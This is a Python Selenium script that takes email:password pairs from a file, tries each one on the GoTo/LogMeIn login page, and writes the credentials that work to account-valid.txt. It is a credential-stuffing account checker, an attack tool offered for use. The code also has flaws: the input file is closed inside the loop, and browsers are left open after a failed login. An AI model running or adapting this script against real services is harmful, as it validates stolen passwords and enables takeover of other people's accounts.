from selenium import webdriver
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.common.by import By
from selenium.webdriver.support.relative_locator import locate_with
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.support.select import Select
from selenium.webdriver.chrome.options import Options
import time
import random
import string
import csv
import json

try:
    with open('accounts.txt', "rt", encoding='utf8') as txt:
        account_data = txt.readlines()
        for account in account_data:
            array_acount = account.split(':')
            email = array_acount[0]
            password = array_acount[1]
            options = Options()
            options.page_load_strategy = 'normal'
            driver = webdriver.Chrome(options=options)
            driver.get("https://authentication.logmeininc.com/login?service=https%3A%2F%2Fauthentication.logmeininc.com%2Foauth%2Fapprove%3Fclient_id%3Da7717fe1-75ce-4f82-b477-2f6dabe3eed9%26response_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fapp.goto.com%252Fg2m-oauth%26state%3D%25257B%252522inflightRequest%252522%25253A%252522https%25253A%25252F%25252Fapp.goto.com%25252Flanding%252522%25252C%252522nonce%252522%25253A%252522bkhYUEJiUkxHUE1mRzM2cWVWZU1EVFRPfmtVdmhaemhPNmwyQ3Q3ek1POA%25253D%25253D%252522%25257D%26code_challenge%3DSEst7beFJyPFGkuFZ26KiIkJHYjQz2Cw_BA42TrXL5A%26code_challenge_method%3DS256%26login_theme%3Dgoto&theme=goto")
            time.sleep(10)
            Email = driver.find_element(By.ID, 'emailAddress')
            Email.clear()
            Email.send_keys(email)
            time.sleep(1)
            btn = driver.find_element(By.ID,'next-button')
            btn.click()
            time.sleep(3)
            Password = driver.find_element(By.ID, 'password')
            Password.clear()
            Password.send_keys(password)
            time.sleep(10)
            caja = driver.find_element(By.ID,'submitdiv')
            btn_submit = caja.find_element(By.ID, 'submit')
            btn_submit.click()
            time.sleep(5)
            try:
                caja = driver.find_element(By.ID, 'chameleon-styling')
                #logout = driver.find_element_by_xpath("//button[contains(text(), 'Copy link')]")
                txt.close()
                with open('./account-valid.txt', 'at') as valid_account_file:
                    valid_account_file.write(email+ ':'+password)
                    valid_account_file.close()
            except Exception as e:
                continue
            driver.quit()
except Exception as e:
    print(e)
